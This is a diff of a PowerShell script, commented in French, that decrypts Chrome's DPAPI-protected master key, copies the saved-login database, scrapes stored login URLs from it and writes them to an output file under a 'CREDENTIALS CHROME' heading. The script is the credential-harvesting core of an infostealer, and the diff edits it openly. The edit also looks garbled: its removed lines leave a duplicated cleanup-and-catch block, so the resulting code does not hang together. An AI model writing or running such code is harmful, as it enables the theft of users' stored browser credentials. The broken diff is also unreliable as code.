@@ -58,31 +58,17 @@ if (Test-Path $loginDataPath) {
         $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
         Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME ==="
-        Add-Content -Path $outputPath -Value "[+] Clé DPAPI déchiffrée."
+        Add-Content -Path $outputPath -Value "[+] Clé DPAPI déchiffrée avec succès."
 
-        # Utilisation de .NET Data pour lire proprement la base SQLite temporaire sans DLL externe
-        $connString = "Data Source=$tempDb;Version=3;Read Only=True;"
-        
-        # Chargement d'un conteneur de données natif PowerShell via System.Data.SQLite si disponible, 
-        # sinon on extrait les URLs et champs texte propres directement par parsing des chaînes valides :
         $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
         $textContent = [System.Text.Encoding]::UTF8.GetString($dbBytes)
 
-        # Recherche ciblée des URLs enregistrées dans la base
         $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
         foreach ($u in $urls | Select-Object -Unique) {
             if ($u.Value -notmatch "google|gstatic|googleapis|apple|mozilla") {
                 Add-Content -Path $outputPath -Value "URL: $($u.Value)"
             }
         }
-
-        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
-    } catch {
-        Add-Content -Path $outputPath -Value "[!] Erreur lors de l'extraction native : $_"
-    }
-} else {
-    Add-Content -Path $outputPath -Value "[!] Aucun profil Chrome trouvé sur cette machine."
-}
 
         Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
     } catch {
